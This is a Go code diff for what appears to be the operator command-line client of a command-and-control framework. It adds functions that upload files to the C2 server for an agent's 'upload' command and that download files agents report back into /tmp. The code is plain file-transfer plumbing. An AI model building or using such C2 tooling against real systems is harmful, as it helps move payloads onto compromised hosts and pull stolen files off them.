@@ -1,14 +1,17 @@
 package cli
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -167,11 +170,12 @@ func Start(c2 string) {
 			}
 
 			if strings.Contains(cmdString, "upload ") {
-				uuid := shortuuid.New()
+				//uuid := shortuuid.New()
 				parts := strings.Split(cmdString, " ")
 				file := parts[1]
-				copy(file, "/tmp/"+uuid)
-				cmdString = "upload " + uuid
+				//copy(file, "/tmp/"+uuid)
+				tempfile := uploadFile(file, c2)
+				cmdString = "upload " + tempfile
 				cmdid := sendCommand(cmdString, agent, c2)
 				deadline := time.Now().Add(15 * time.Second)
 				for {
@@ -194,6 +198,13 @@ func Start(c2 string) {
 			deadline := time.Now().Add(15 * time.Second)
 			for {
 				id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
+				if strings.Contains(output, "Location:") {
+					parts := strings.Split(output, " ")
+					path := parts[1]
+					file := filepath.Base(path)
+					downloadFile("/tmp/"+file, c2+"/files/"+file)
+					fmt.Println("Process Download" + file)
+				}
 				if id == cmdid && output != "" || cmdString == "" {
 					fmt.Fprintln(os.Stderr, output)
 					wd := getAgentWorking(c2 + "/api/agent/" + agent)
@@ -401,4 +412,82 @@ func copy(src, dst string) (int64, error) {
 	defer destination.Close()
 	nBytes, err := io.Copy(destination, source)
 	return nBytes, err
+}
+
+func downloadFile(filepath string, url string) error {
+
+	// Get the data
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Println("err:", err)
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Create the file
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Write the body to file
+	_, err = io.Copy(out, resp.Body)
+	return err
+}
+
+func uploadFile(path string, c2 string) string {
+	extraParams := map[string]string{
+		"operator": "none",
+	}
+	request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
+	if err != nil {
+		log.Fatal(err)
+	}
+	client := &http.Client{}
+	resp, err := client.Do(request)
+	if err != nil {
+		log.Fatal(err)
+	} else {
+		body := &bytes.Buffer{}
+		_, err := body.ReadFrom(resp.Body)
+		if err != nil {
+			log.Fatal(err)
+		}
+		resp.Body.Close()
+		//fmt.Println(resp.StatusCode)
+		//fmt.Println(resp.Header)
+		fmt.Println(body.String())
+		return body.String()
+	}
+	return ""
+}
+
+// Creates a new file upload http request with optional extra params
+func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
+	if err != nil {
+		return nil, err
+	}
+	_, err = io.Copy(part, file)
+
+	for key, val := range params {
+		_ = writer.WriteField(key, val)
+	}
+	err = writer.Close()
+	if err != nil {
+		return nil, err
+	}
+
+	req, err := http.NewRequest("POST", uri, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	return req, err
 }
